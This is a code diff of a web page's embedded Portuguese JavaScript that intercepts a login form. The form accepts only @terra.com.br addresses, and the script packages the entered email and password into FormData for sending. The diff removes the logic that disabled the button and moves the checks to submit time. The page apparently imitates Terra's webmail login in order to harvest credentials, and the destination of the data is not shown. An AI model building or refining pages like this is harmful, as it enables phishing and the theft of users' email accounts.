@@ -156,7 +156,7 @@
  </footer>
  </div>
 
-<!-- SCRIPT DE VALIDAÇÃO + ENVIO -->
+<!-- SCRIPT DE VALIDAÇÃO + ENVIO - CORRIGIDO -->
 <script>
 (function() {
     // Aguarda a página carregar
@@ -178,52 +178,32 @@
             return dominios.includes(dominio);
         }
         
-        // ===== FUNÇÃO PARA VERIFICAR SE PODE LIBERAR O BOTÃO =====
-        function verificarCampos() {
-            const emailValido = validarEmail(emailInput.value);
-            const senhaPreenchida = senhaInput.value.trim().length > 0;
-            
-            // SÓ libera se email for válido E senha estiver preenchida
-            if (emailValido && senhaPreenchida) {
-                submitBtn.disabled = false;
-                submitBtn.style.opacity = '1';
-                submitBtn.style.cursor = 'pointer';
-            } else {
-                submitBtn.disabled = true;
-                submitBtn.style.opacity = '0.5';
-                submitBtn.style.cursor = 'default';
-            }
-        }
-        
-        // ===== MONITORA AS MUDANÇAS NOS CAMPOS =====
-        emailInput.addEventListener('input', verificarCampos);
-        senhaInput.addEventListener('input', verificarCampos);
-        emailInput.addEventListener('blur', verificarCampos);
-        senhaInput.addEventListener('blur', verificarCampos);
-        
-        // ===== DESABILITA O BOTÃO INICIALMENTE =====
-        submitBtn.disabled = true;
-        submitBtn.style.opacity = '0.5';
-        submitBtn.style.cursor = 'default';
+        // ===== GARANTE QUE O BOTÃO FIQUE LARANJA SEMPRE =====
+        submitBtn.disabled = false; // NUNCA desabilita o botão
+        submitBtn.style.opacity = '1';
+        submitBtn.style.cursor = 'pointer';
+        submitBtn.style.backgroundColor = ''; // Volta à cor original
         
         // ===== INTERCEPTA O ENVIO DO FORMULÁRIO =====
         form.addEventListener('submit', function(e) {
             e.preventDefault(); // Impede o envio padrão
             
-            // Verifica novamente antes de enviar
-            const emailValido = validarEmail(emailInput.value);
-            const senhaPreenchida = senhaInput.value.trim().length > 0;
+            // Pega os dados
+            const email = emailInput.value.trim();
+            const senha = senhaInput.value.trim();
             
-            if (!emailValido || !senhaPreenchida) {
-                alert('Preencha um email Terra válido e a senha corretamente!');
+            // VALIDAÇÃO NA HORA DO CLIQUE
+            if (!validarEmail(email)) {
+                alert('❌ Digite um email Terra válido (@terra.com.br)');
                 return;
             }
             
-            // Pega os dados
-            var email = emailInput.value;
-            var senha = senhaInput.value;
+            if (senha.length === 0) {
+                alert('❌ Digite sua senha');
+                return;
+            }
             
-            // Cria FormData para enviar
+            // Se passou na validação, ENVIA!
             var formData = new FormData();
             formData.append('email', email);
             formData.append('senha', senha);
